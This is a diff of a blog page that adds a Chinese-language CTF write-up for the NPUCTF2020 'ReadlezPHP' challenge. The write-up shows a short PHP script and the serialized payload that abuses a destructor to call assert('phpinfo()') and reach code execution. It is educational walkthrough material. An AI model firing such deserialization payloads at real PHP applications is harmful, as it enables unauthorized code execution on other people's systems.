@@ -9,7 +9,7 @@
     
     <title>
         
-            Tags |
+            ReadlezPHP |
         
         paixiaoxing&#39;s Blog
     </title>
@@ -81,7 +81,7 @@
                         </li>
                     
                         <li class="menu-item">
-                            <a class="active"
+                            <a class=""
                                href="/tags"
                             >
                                 TAGS
@@ -122,7 +122,7 @@
                 </li>
             
                 <li class="drawer-menu-item flex-center">
-                    <a class="active"
+                    <a class=""
                        href="/tags">TAGS</a>
                 </li>
             
@@ -146,15 +146,129 @@
             <div class="main-content">
 
                 
-                    
-    <div class="fade-in-down-animation">
-        <div class="tagcloud-container">
-            <div class="tagcloud-content">
-                <a href="/tags/ASIS/" style="font-size: 1rem;">ASIS</a> <a href="/tags/BJDCTF/" style="font-size: 1.3rem;">BJDCTF</a> <a href="/tags/CISCN/" style="font-size: 1.6rem;">CISCN</a> <a href="/tags/Cyber-Grabs/" style="font-size: 1.3rem;">Cyber Grabs</a> <a href="/tags/GWCTF/" style="font-size: 1rem;">GWCTF</a> <a href="/tags/GXYCTF/" style="font-size: 1.3rem;">GXYCTF</a> <a href="/tags/ISITDTU/" style="font-size: 1rem;">ISITDTU</a> <a href="/tags/MRCTF/" style="font-size: 1rem;">MRCTF</a> <a href="/tags/MRCTF2020/" style="font-size: 1rem;">MRCTF2020</a> <a href="/tags/NPUCTF2020/" style="font-size: 1rem;">NPUCTF2020</a> <a href="/tags/RoarCTF/" style="font-size: 1rem;">RoarCTF</a> <a href="/tags/SWPU2019/" style="font-size: 1rem;">SWPU2019</a> <a href="/tags/SWPUCTF/" style="font-size: 1rem;">SWPUCTF</a> <a href="/tags/V-NCTF/" style="font-size: 1.6rem;">V&NCTF</a> <a href="/tags/WUSTCTF2020/" style="font-size: 1rem;">WUSTCTF2020</a> <a href="/tags/ctf-show/" style="font-size: 1rem;">ctf-show</a> <a href="/tags/hgame/" style="font-size: 1.3rem;">hgame</a> <a href="/tags/knightctf/" style="font-size: 1.6rem;">knightctf</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 1.3rem;">安洵杯</a> <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" style="font-size: 1.3rem;">极客大挑战</a> <a href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/" style="font-size: 1.3rem;">网鼎杯</a>
-            </div>
-        </div>
-    </div>
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
+        <div class="article-title">
+            <span class="title-hover-animation">ReadlezPHP</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/paidaxing.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">paixiaoxing</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-03-20 18:12:16</span>
+        <span class="mobile">2022-03-20 18:12</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/NPUCTF2020/">NPUCTF2020</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>题目页面啥也没看出来，打开源码看看</p>
+<p><img src="/2022/03/20/ReadlezPHP/1.png" alt="1"></p>
+<p>找到一个页面，打开看看</p>
+<p><img src="/2022/03/20/ReadlezPHP/2.png" alt="1"></p>
+<p>看出意图，反序列化题目，分析一下代码，这个类的作用主要就是先将时间代码写入类的a，b中然后再下面的析构方法组合，我们需要重写构造方法，构造出assert(phpinfo())也就是说我们的b要构造成assert，然后a构造phpinfo()然后序列化一下传入data就行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b = &quot;assert&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">c = new HelloPhp;</span></span><br><span class="line">echo serialize($c);</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<p><code>data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></p>
+<p>flag在phpinfo里面</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：ReadlezPHP</li>
+        <li>Post author：paixiaoxing</li>
+        <li>Create time：2022-03-20 18:12:16</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2022/03/20/ReadlezPHP/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/NPUCTF2020/">#NPUCTF2020</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/03/20/%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">华东南赛区-Web11</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
 
 
                 
@@ -199,6 +313,23 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-bottom-side-tools">
@@ -246,6 +377,14 @@
     </div>
 
     
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NPUCTF2020-ReadlezPHP"><span class="nav-number">1.</span> <span class="nav-text">[NPUCTF2020]ReadlezPHP</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
 
     <div class="image-viewer-container">
     <img src="">
@@ -281,6 +420,14 @@
 
 
 <div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
     
 </div>
 
